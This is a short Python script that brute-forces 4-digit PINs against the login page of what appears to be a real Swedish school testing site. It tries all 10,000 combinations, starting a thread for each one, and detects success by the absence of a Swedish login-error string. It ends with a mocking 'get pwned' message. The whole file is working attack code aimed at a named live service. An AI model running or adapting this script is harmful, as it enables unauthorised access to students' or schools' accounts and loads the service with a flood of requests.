import requests
import os
import itertools
from threading import Thread

cookies = {
    '_ga': 'GA1.2.2027800500.1629718268',
    '_gid': 'GA1.2.352058431.1629981431',
}

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"',
    'sec-ch-ua-mobile': '?0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'https://student5.kartlaggaren.se',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': '', # User Agent
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Referer': 'https://student5.kartlaggaren.se/site/Login/',
    'Accept-Language': 'sv,en;q=0.9',
}

def login(pin, _):
    data = {
    '__LASTFOCUS': '',
    '__EVENTTARGET': 'buttonEnterPin',
    '__EVENTARGUMENT': '',
    '__VIEWSTATE': '', # View state
    '__VIEWSTATEGENERATOR': '', # View token
    '__EVENTVALIDATION': '', # Event validation
    'dropdownChooseRegion': '', # Region
    'dropdownChoosePostal': '', # Postal
    'dropdownChooseSchool': '', # School
    'dropdownChooseTest':   '', # Subject
    'inputEnterPin': str(pin)
    }

    response = requests.post('https://student5.kartlaggaren.se/site/Login/', headers=headers, cookies=cookies, data=data)
    if response.text.find("Fel vid inloggning!!") != -1:
        print(pin, "was incorrect")
    else:
        print(pin, "is correct :) get pwned by kiko lololol op epic esketit lil pumping")
        os._exit(1)
y = ''
threads = []
for c in itertools.product('0123456789', repeat=4):
    pin = y+''.join(c)
    t = Thread(target=login, args=(pin, "."))
    t.start()
    threads.append(t)

for t in threads:
    t.join()
